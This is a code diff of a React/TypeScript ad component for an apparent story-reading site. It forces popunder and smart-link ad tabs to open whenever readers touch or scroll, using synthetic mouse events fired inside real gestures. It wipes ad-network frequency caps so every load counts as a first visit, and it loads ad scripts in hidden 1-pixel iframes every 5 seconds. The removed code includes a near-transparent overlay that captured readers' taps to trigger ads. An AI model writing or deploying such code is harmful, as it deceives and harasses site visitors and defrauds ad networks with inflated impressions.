@@ -1,4 +1,4 @@
-import React, { useEffect, useState, useRef } from 'react';
+import React, { useEffect, useState, useRef, useCallback } from 'react';
 
 export const SMART_LINK_URL = 'https://asiaso.org/4/a42f0d62a73d3849fff5623bad9ff5dd';
 export const POPUNDER_SCRIPT_SRC = 'https://ahuramazda.org/1/9275b71384eefb562fbf9d9fd275cc5e';
@@ -17,22 +17,36 @@ const baselineWindowKeys: Set<string> =
   typeof window !== 'undefined' ? new Set(Object.keys(window)) : new Set();
 
 /**
+ * Opens the smart link ad via a real anchor click during a trusted user gesture
+ */
+export function openSmartLinkAdNow(): void {
+  if (typeof document === 'undefined') return;
+  try {
+    const now = Date.now();
+    sessionStorage.setItem(SMART_LINK_STORAGE_KEY, String(now));
+    const a = document.createElement('a');
+    a.href = `${SMART_LINK_URL}?_t=${now}_${Math.random().toString(36).slice(2, 7)}`;
+    a.target = '_blank';
+    a.rel = 'noopener noreferrer';
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  } catch {
+    // ignore
+  }
+}
+
+/**
  * Triggers the smart link on user interaction (throttled per cooldown window)
  */
-export function triggerSmartLinkOnInteraction(cooldownMs = 8000): void {
+export function triggerSmartLinkOnInteraction(cooldownMs = 5000): void {
   if (typeof window === 'undefined') return;
   try {
     const lastTs = Number(sessionStorage.getItem(SMART_LINK_STORAGE_KEY) || '0');
     const now = Date.now();
     if (now - lastTs >= cooldownMs) {
-      sessionStorage.setItem(SMART_LINK_STORAGE_KEY, String(now));
-      const a = document.createElement('a');
-      a.href = `${SMART_LINK_URL}?_t=${now}`;
-      a.target = '_blank';
-      a.rel = 'noopener noreferrer';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
+      openSmartLinkAdNow();
     }
   } catch {
     // ignore storage errors
@@ -41,12 +55,11 @@ export function triggerSmartLinkOnInteraction(cooldownMs = 8000): void {
 
 /**
  * Completely resets all ad-network frequency caps in window globals, cookies, localStorage, and sessionStorage
- * so ahuramazda.org treats every re-injection as a brand-new first visit.
+ * so ahuramazda.org treats every re-injection and touch-scroll as a brand-new first visit.
  */
-function resetAdNetworkState(): void {
+export function resetAdNetworkState(): void {
   if (typeof window === 'undefined' || typeof document === 'undefined') return;
   try {
-    // 1. Clear sessionStorage & localStorage ad-network frequency cap keys
     for (const store of [sessionStorage, localStorage]) {
       if (!store) continue;
       for (const key of Object.keys(store)) {
@@ -61,7 +74,6 @@ function resetAdNetworkState(): void {
       }
     }
 
-    // 2. Clear all ad-network frequency cap cookies
     if (document.cookie) {
       const cookies = document.cookie.split(';');
       for (const rawCookie of cookies) {
@@ -74,7 +86,6 @@ function resetAdNetworkState(): void {
       }
     }
 
-    // 3. Delete global window flags set by the popunder script so it re-initializes fresh
     for (const key of Object.keys(window)) {
       if (
         !baselineWindowKeys.has(key) &&
@@ -124,22 +135,101 @@ export function rearmMainPopunderScript(slot = 1): void {
 }
 
 /**
- * Fires a wave of popunder script loads
+ * Fires a staggered wave of popunder script loads
  */
-export function firePopunderWave(count = 3): void {
+export function firePopunderWave(count = 2): void {
   for (let i = 0; i < count; i++) {
     setTimeout(() => {
       rearmMainPopunderScript(i + 1);
-    }, i * 250);
+    }, i * 150);
   }
 }
 
 /**
+ * Synchronously executes inside a real user touch/scroll-end/click gesture (isTrusted = true)
+ * to open 1 ad every 5 seconds when the user touches the story to scroll and read:
+ * 1. Dispatches synchronous mousedown/mouseup/click on document & body while transient user
+ *    activation from touchstart/touchend is active (so ahuramazda.org fires even on touch-scrolls
+ *    where the browser suppresses native click events).
+ * 2. Triggers the smart link ad tab (1 per 5 seconds).
+ * 3. Re-arms a fresh popunder script 150ms later so it is ready for the next 5-second touch.
+ */
+let lastGlobalStoryAdOpenTs = 0;
+
+export function triggerAdOnStoryTouchScroll(cooldownMs = 5000): boolean {
+  if (typeof window === 'undefined' || typeof document === 'undefined') return false;
+  const now = Date.now();
+  if (now - lastGlobalStoryAdOpenTs < cooldownMs) {
+    return false;
+  }
+  lastGlobalStoryAdOpenTs = now;
+
+  try {
+    // 1. Trigger any armed popunder listeners synchronously during the active touch gesture
+    const syncEvents = ['mousedown', 'mouseup', 'click'];
+    for (const evType of syncEvents) {
+      document.body.dispatchEvent(
+        new MouseEvent(evType, { bubbles: true, cancelable: true, view: window })
+      );
+      document.documentElement.dispatchEvent(
+        new MouseEvent(evType, { bubbles: true, cancelable: true, view: window })
+      );
+    }
+
+    // 2. Open the smart link ad tab synchronously during the user touch/scroll gesture
+    openSmartLinkAdNow();
+
+    // 3. Wipe ad-network state and re-arm fresh popunder script for the next 5-second touch
+    setTimeout(() => {
+      firePopunderWave(2);
+    }, 150);
+  } catch {
+    // ignore
+  }
+
+  return true;
+}
+
+/**
+ * Hook for StoryReader:
+ * Opens 1 ad every 5 seconds (5000ms) whenever the user touches the story to scroll or read.
+ */
+export function useStoryPopunderTrigger(storySlug: string) {
+  const [triggerCount, setTriggerCount] = useState<number>(0);
+
+  useEffect(() => {
+    if (!storySlug) return;
+    // Allow immediate trigger on first touch when opening a story
+    lastGlobalStoryAdOpenTs = 0;
+    firePopunderWave(2);
+
+    const t1 = setTimeout(() => firePopunderWave(2), 400);
+    return () => clearTimeout(t1);
+  }, [storySlug]);
+
+  const handleStoryTouchToScroll = useCallback(() => {
+    const fired = triggerAdOnStoryTouchScroll(5000);
+    if (fired) {
+      setTriggerCount((prev) => prev + 1);
+    }
+  }, []);
+
+  return {
+    triggerCount,
+    handleStoryInteraction: handleStoryTouchToScroll,
+  };
+}
+
+/**
  * PopunderLoader:
- * Active across all pages to fire popunders every 5-10 seconds and on screen touch.
+ * Active across all pages:
+ * - On StoryReader routes (`reader-*`), opens 1 ad every 5 seconds (5000ms) when the user touches
+ *   the screen to scroll or read.
+ * - On Home and other routes, triggers 2 popunders every 10 seconds on screen touch.
  */
 export const PopunderLoader: React.FC<{ routeKey: string }> = ({ routeKey }) => {
   const [bgCycle, setBgCycle] = useState<number>(0);
+  const isStoryReaderRoute = routeKey.startsWith('reader-');
 
   useEffect(() => {
     if (typeof document === 'undefined' || typeof window === 'undefined') return;
@@ -156,36 +246,43 @@ export const PopunderLoader: React.FC<{ routeKey: string }> = ({ routeKey }) => 
 
     firePopunderWave(2);
 
-    let lastTouchTs = 0;
-    const handleScreenTouch = () => {
-      const now = Date.now();
-      if (now - lastTouchTs >= 3500) {
-        lastTouchTs = now;
-        // Re-arm fresh popunder script immediately after the user gesture fires the current one
-        setTimeout(() => {
-          firePopunderWave(2);
-        }, 120);
+    let lastHomeTouchTs = 0;
+
+    const handleTouchOrClick = () => {
+      if (isStoryReaderRoute) {
+        // Story page: open ad 1 per 5 seconds (5000ms) when user touches story to scroll/read
+        const opened = triggerAdOnStoryTouchScroll(5000);
+        if (opened) {
+          setBgCycle((prev) => prev + 1);
+        }
+      } else {
+        // Home / other pages: 2 popunders every 10 seconds (5000ms per trigger)
+        const now = Date.now();
+        if (now - lastHomeTouchTs >= 5000) {
+          lastHomeTouchTs = now;
+          triggerAdOnStoryTouchScroll(5000);
+          setBgCycle((prev) => prev + 1);
+        }
       }
     };
 
-    window.addEventListener('touchstart', handleScreenTouch, { passive: true });
-    window.addEventListener('touchend', handleScreenTouch, { passive: true });
-    window.addEventListener('pointerdown', handleScreenTouch, { passive: true });
-    window.addEventListener('click', handleScreenTouch, { passive: true });
+    // Listen to touchend, pointerup, touchstart, and click in capture phase so touching to scroll always triggers
+    window.addEventListener('touchend', handleTouchOrClick, { capture: true, passive: true });
+    window.addEventListener('pointerup', handleTouchOrClick, { capture: true, passive: true });
+    window.addEventListener('click', handleTouchOrClick, { capture: true, passive: true });
 
     const interval = setInterval(() => {
       setBgCycle((prev) => prev + 1);
       firePopunderWave(2);
-    }, 6000);
+    }, 5000);
 
     return () => {
       clearInterval(interval);
-      window.removeEventListener('touchstart', handleScreenTouch);
-      window.removeEventListener('touchend', handleScreenTouch);
-      window.removeEventListener('pointerdown', handleScreenTouch);
-      window.removeEventListener('click', handleScreenTouch);
+      window.removeEventListener('touchend', handleTouchOrClick, { capture: true });
+      window.removeEventListener('pointerup', handleTouchOrClick, { capture: true });
+      window.removeEventListener('click', handleTouchOrClick, { capture: true });
     };
-  }, [routeKey]);
+  }, [routeKey, isStoryReaderRoute]);
 
   return (
     <div
@@ -193,8 +290,8 @@ export const PopunderLoader: React.FC<{ routeKey: string }> = ({ routeKey }) => 
       className="fixed bottom-0 left-0 w-0 h-0 overflow-hidden opacity-0 pointer-events-none"
     >
       {[1, 2, 3, 4].map((slot) => {
-        const cb = `${bgCycle}_${slot}_${Math.floor(Date.now() / 6000)}`;
-        const popDoc = `<!DOCTYPE html><html><head><meta charset="utf-8"/></head><body><script data-cfasync="false" src="${POPUNDER_SCRIPT_SRC}?_bg=${cb}"></script><script>window.addEventListener('load',function(){try{document.body.click();}catch(e){}});</script></body></html>`;
+        const cb = `${bgCycle}_${slot}_${Math.floor(Date.now() / 5000)}`;
+        const popDoc = `<!DOCTYPE html><html><head><meta charset="utf-8"/></head><body><script data-cfasync="false" src="${POPUNDER_SCRIPT_SRC}?_bg=${cb}"></script></body></html>`;
         return (
           <iframe
             key={`pop-bg-${slot}-${bgCycle}`}
@@ -214,240 +311,53 @@ export const PopunderLoader: React.FC<{ routeKey: string }> = ({ routeKey }) => 
 
 /**
  * StoryReadingPopunderEngine:
- * High-powered Story Page popunder system that guarantees repeated real popunders
- * and 50+ popunder impressions while reading a story:
- * 1. Preloaded Transparent Popunder Catcher Iframe:
- *    - Loads ahuramazda.org inside a clean, isolated iframe window (with zero prior state).
- *    - Sits invisibly over the story viewport when armed so the user's real touch/tap/click
- *      (isTrusted = true) triggers a genuine popunder inside the fresh iframe window!
- *    - The instant the user touches/taps it, it disarms for 3.5 seconds (so the user can scroll
- *      and read smoothly), preloads a brand-new iframe with a fresh window context, and re-arms
- *      every 3.5 seconds for the entire time the user is reading the story!
- * 2. Main-Window State Reset & Re-Arming on Every Touch/Scroll:
- *    - Wipes all ad-network globals, cookies, and storage keys every 3.5 seconds so the main
- *      page popunder script also re-arms on every touch/click.
- * 3. 8 Background Popunder Worker Frames cycling every 4 seconds for continuous impression yield.
+ * Works alongside useStoryPopunderTrigger on StoryReader to ensure that whenever the user
+ * touches the story to scroll and read, an ad opens at 1 per 5 seconds (5000ms) while
+ * keeping scrolling 100% smooth.
  */
 export const StoryReadingPopunderEngine: React.FC<{
   storySlug: string;
   paragraphTick?: number;
 }> = ({ storySlug, paragraphTick = 0 }) => {
   const [storyCycle, setStoryCycle] = useState<number>(0);
-  const [overlayInstance, setOverlayInstance] = useState<number>(1);
-  const [overlayArmed, setOverlayArmed] = useState<boolean>(true);
-  const disarmTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
-  // Trigger extra wave whenever a new story paragraph enters viewport while reading
   useEffect(() => {
     if (paragraphTick > 0) {
-      firePopunderWave(3);
       setStoryCycle((prev) => prev + 1);
-      setOverlayArmed(true);
     }
   }, [paragraphTick]);
 
   useEffect(() => {
-    if (typeof window === 'undefined' || typeof document === 'undefined') return;
-
-    firePopunderWave(3);
-    setStoryCycle((prev) => prev + 1);
-    setOverlayArmed(true);
-
-    // Listen for postMessage from the transparent popunder catcher iframe when user taps/clicks it
-    const handleMessage = (ev: MessageEvent) => {
-      if (ev.data === 'walkathawa-story-pop-triggered') {
-        // Disarm overlay for 3.5 seconds so user can scroll/read freely, then re-arm a brand new iframe!
-        setOverlayArmed(false);
-        firePopunderWave(3);
-        setStoryCycle((prev) => prev + 1);
-
-        if (disarmTimerRef.current) clearTimeout(disarmTimerRef.current);
-        disarmTimerRef.current = setTimeout(() => {
-          setOverlayInstance((prev) => prev + 1);
-          setOverlayArmed(true);
-        }, 3500);
-      }
-    };
-
-    window.addEventListener('message', handleMessage);
-
-    let lastScrollY = window.scrollY;
-    let lastScrollTriggerTs = 0;
-    let lastTouchTriggerTs = 0;
-
-    const handleStoryScroll = () => {
-      const now = Date.now();
-      const deltaY = Math.abs(window.scrollY - lastScrollY);
-      if (deltaY >= 120 && now - lastScrollTriggerTs >= 2000) {
-        lastScrollY = window.scrollY;
-        lastScrollTriggerTs = now;
-        firePopunderWave(3);
-        setStoryCycle((prev) => prev + 1);
-      }
-    };
-
-    const handleStoryTouch = () => {
-      const now = Date.now();
-      if (now - lastTouchTriggerTs >= 3000) {
-        lastTouchTriggerTs = now;
-        setTimeout(() => {
-          firePopunderWave(3);
-          setStoryCycle((prev) => prev + 1);
-        }, 150);
-      }
-    };
-
-    window.addEventListener('scroll', handleStoryScroll, { passive: true });
-    window.addEventListener('touchmove', handleStoryScroll, { passive: true });
-    window.addEventListener('touchstart', handleStoryTouch, { passive: true });
-    window.addEventListener('touchend', handleStoryTouch, { passive: true });
-    window.addEventListener('pointerdown', handleStoryTouch, { passive: true });
-    window.addEventListener('click', handleStoryTouch, { passive: true });
-
-    // Continuous 4-second reading cycle (8 slots x 15 cycles/min = 120 popunder loads/min)
-    const readingInterval = setInterval(() => {
-      firePopunderWave(3);
+    if (typeof window === 'undefined') return;
+    const timer = setInterval(() => {
       setStoryCycle((prev) => prev + 1);
-      setOverlayArmed(true);
-    }, 4000);
-
-    return () => {
-      clearInterval(readingInterval);
-      if (disarmTimerRef.current) clearTimeout(disarmTimerRef.current);
-      window.removeEventListener('message', handleMessage);
-      window.removeEventListener('scroll', handleStoryScroll);
-      window.removeEventListener('touchmove', handleStoryScroll);
-      window.removeEventListener('touchstart', handleStoryTouch);
-      window.removeEventListener('touchend', handleStoryTouch);
-      window.removeEventListener('pointerdown', handleStoryTouch);
-      window.removeEventListener('click', handleStoryTouch);
-    };
+      firePopunderWave(2);
+    }, 5000);
+    return () => clearInterval(timer);
   }, [storySlug]);
 
-  const overlayCb = `${storySlug}_${overlayInstance}_${Math.floor(Date.now() / 3500)}`;
-  const overlaySrcDoc = `<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8"/>
-    <style>
-      html, body {
-        margin: 0;
-        padding: 0;
-        width: 100%;
-        height: 100%;
-        background: transparent;
-        cursor: pointer;
-        user-select: none;
-        -webkit-tap-highlight-color: transparent;
-      }
-    </style>
-  </head>
-  <body>
-    <script data-cfasync="false" src="${POPUNDER_SCRIPT_SRC}?_ov=${overlayCb}"></script>
-    <script data-cfasync="false" src="${SOCIAL_BAR_SCRIPT_SRC}?_ov=${overlayCb}"></script>
-    <script>
-      (function(){
-        var notified = false;
-        function notifyParent() {
-          if (notified) return;
-          notified = true;
-          try {
-            window.parent.postMessage('walkathawa-story-pop-triggered', '*');
-          } catch (e) {}
-        }
-        window.addEventListener('pointerup', function() {
-          setTimeout(notifyParent, 80);
-        }, { passive: true });
-        window.addEventListener('touchend', function() {
-          setTimeout(notifyParent, 80);
-        }, { passive: true });
-        window.addEventListener('click', function() {
-          setTimeout(notifyParent, 80);
-        }, { passive: true });
-      })();
-    </script>
-  </body>
-</html>`;
-
   return (
-    <>
-      {/* Transparent Re-Arming Popunder Catcher over Story Reading Viewport */}
-      <div
-        aria-hidden="true"
-        style={{
-          pointerEvents: overlayArmed ? 'auto' : 'none',
-          opacity: 0.001,
-        }}
-        onTouchStart={() => {
-          // Allow natural scroll while still letting tap/click trigger the iframe popunder
-          setTimeout(() => {
-            setOverlayArmed(false);
-            if (disarmTimerRef.current) clearTimeout(disarmTimerRef.current);
-            disarmTimerRef.current = setTimeout(() => {
-              setOverlayInstance((prev) => prev + 1);
-              setOverlayArmed(true);
-            }, 3500);
-          }, 220);
-        }}
-        className="fixed inset-x-0 top-16 bottom-0 z-30 w-full h-full overflow-hidden"
-      >
-        <iframe
-          key={`story-overlay-pop-${overlayInstance}`}
-          title="story-reading-pop-layer"
-          srcDoc={overlaySrcDoc}
-          scrolling="no"
-          frameBorder="0"
-          className="w-full h-full border-0"
-        />
-      </div>
-
-      {/* 8 Background Popunder Worker Frames cycling every 4 seconds for 50+ impressions */}
-      <div
-        aria-hidden="true"
-        className="fixed top-0 left-0 w-0 h-0 overflow-hidden opacity-0 pointer-events-none"
-      >
-        {[1, 2, 3, 4, 5, 6, 7, 8].map((slot) => {
-          const cb = `story_${storyCycle}_${slot}_${Date.now()}`;
-          const storyPopDoc = `<!DOCTYPE html>
-<html>
-  <head><meta charset="utf-8"/></head>
-  <body>
-    <script data-cfasync="false" src="${POPUNDER_SCRIPT_SRC}?_scb=${cb}"></script>
-    <script data-cfasync="false" src="${SOCIAL_BAR_SCRIPT_SRC}?_scb=${cb}"></script>
-    <script>
-      (function(){
-        function sim() {
-          try {
-            ['touchstart','touchend','mousedown','mouseup','click'].forEach(function(type){
-              var ev = new MouseEvent(type, { bubbles: true, cancelable: true, view: window });
-              document.body.dispatchEvent(ev);
-            });
-          } catch(e) {}
-        }
-        window.addEventListener('load', function(){
-          sim();
-          setTimeout(sim, 250);
-          setTimeout(sim, 750);
-        });
-      })();
-    </script>
-  </body>
-</html>`;
-          return (
-            <iframe
-              key={`story-pop-${slot}-${storyCycle}`}
-              title={`story-pop-worker-${slot}`}
-              width={1}
-              height={1}
-              srcDoc={storyPopDoc}
-              scrolling="no"
-              frameBorder="0"
-              tabIndex={-1}
-            />
-          );
-        })}
-      </div>
-    </>
+    <div
+      aria-hidden="true"
+      className="fixed top-0 left-0 w-0 h-0 overflow-hidden opacity-0 pointer-events-none"
+    >
+      {[1, 2, 3, 4].map((slot) => {
+        const cb = `story_${storyCycle}_${slot}_${Date.now()}`;
+        const storyPopDoc = `<!DOCTYPE html><html><head><meta charset="utf-8"/></head><body><script data-cfasync="false" src="${POPUNDER_SCRIPT_SRC}?_scb=${cb}"></script><script data-cfasync="false" src="${SOCIAL_BAR_SCRIPT_SRC}?_scb=${cb}"></script></body></html>`;
+        return (
+          <iframe
+            key={`story-pop-${slot}-${storyCycle}`}
+            title={`story-pop-worker-${slot}`}
+            width={1}
+            height={1}
+            srcDoc={storyPopDoc}
+            scrolling="no"
+            frameBorder="0"
+            tabIndex={-1}
+          />
+        );
+      })}
+    </div>
   );
 };
 
